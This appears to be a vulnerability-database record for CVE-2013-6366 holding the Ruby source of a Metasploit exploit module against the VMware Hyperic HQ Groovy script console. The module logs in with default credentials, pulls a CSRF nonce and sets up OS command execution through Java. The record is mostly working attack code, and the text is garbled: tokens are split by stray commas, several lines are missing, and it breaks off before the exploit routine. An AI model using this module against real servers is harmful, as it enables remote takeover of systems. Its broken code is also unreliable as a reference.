{
    "text": "vul_name : VMware Hyperic HQ Groovy Script-Console Java Execution ， vul_cve : CVE-2013-6366 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStagerVBS ， super ( update_info ( info ,  ， 'Name' => 'VMware Hyperic HQ Groovy Script-Console Java Execution' ,  ， 'Description' => %q{ ， This module uses the VMware Hyperic HQ Groovy script console to execute ， OS commands using Java. Valid credentials for an application administrator ， user account are required. This module has been tested successfully with ， Hyperic HQ 4.6.6 on Windows 2003 SP2 and Ubuntu 10.04 systems. ， } ,  ， 'Author' => ，  [  ， 'Brendan Coles <bcoles [ at ] gmail.com>' # Metasploit ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， 'DefaultOptions' => ， { ， 'WfsDelay' => '15' ,  ， } ,  ， ' ，  [  ，  [ 'URL' , ' ，  ]  ,  ， 'Targets' => ，  [  ，  # Tested on Hyperic HQ versions 4.5.2-win32 and 4.6.6-win32 on Windows XP SP3 and Ubuntu 10.04 ，  [ 'Automatic' , {} ]  ,  ，  [ 'Windows' , {'Arch' => ARCH_X86 , 'Platform' => 'win'} ]  ,  ，  [ 'Linux' , {'Arch' => ARCH_X86 , 'Platform' => 'linux' } ]  ,  ，  [ 'Unix CMD' , {'Arch' => ARCH_CMD , 'Platform' => 'unix' , 'Payload' => {'BadChars' => \"\\x22\"} ]  ，  ]  ,  ， 'Platform' => %w{ win linux unix } ,  ， 'Privileged' => false ,  # Privileged on Windows but not on * nix targets ， 'DisclosureDate' => 'Oct 10 2013' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptBool.new ( 'SSL' ,  [ true , 'Use SSL' , true ]  )  ,  ， Opt : RPORT ( 7443 )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'The username for the application' , 'hqadmin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'The password for the application' , 'hqadmin' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The path to HypericHQ' , '/' ]  )  ,  ，  ]  , self.class )  ， end ，  # Login ，  @ cookie = \"JSESSIONID= # {Rex : Text.rand_text_hex ( 32 ) }\" ， res = send_request_cgi ( { ， 'uri' => normalize_uri (  @ uri.path , \"j_spring_security_check?org.apache.catalina.filters.CSRF_NONCE=\" )  ,  ， 'method' => 'POST' ,  ， 'cookie' => @ cookie ,  ， 'vars_post' => { ， 'j_username' => Rex : Text.uri_encode ( user , 'hex-normal' )  ,  ， 'j_password' => Rex : Text.uri_encode ( pass , 'hex-normal' )  ,  ， 'submit' => 'Sign+in' ， } ， } )  ， res ， end ，  # Check access to the Groovy script console and get CSRF nonce ， def get_nonce ， res = send_request_cgi ( { ， 'uri' => normalize_uri (  @ uri.path , \"mastheadAttach.do?typeId=10003\" )  ,  ， 'cookie' => @ cookie ， } )  ， print_warning ( \" # {peer} - Could not access the script console\" )  ， end ，  @ nonce = $ 1 ， vprint_status ( \" # {peer} - Found token ' # { @ nonce}'\" )  ， end ， end ，  # Check credentials and check for access to the Groovy console ， def check ，  @ uri = target_uri ， user = datastore [ 'USERNAME' ]  ， pass = datastore [ 'PASSWORD' ]  ，  # login ， print_status ( \" # {peer} - Authenticating as ' # {user}'\" )  ， res = login ( user , pass )  ， print_good ( \" # {peer} - Authenticated successfully as ' # {user}'\" )  ，  # check access to the console ， print_status ( \" # {peer} - Checking access to the script console\" )  ， get_nonce",
    "time": "2013-10-12 / 2013-11-13"
}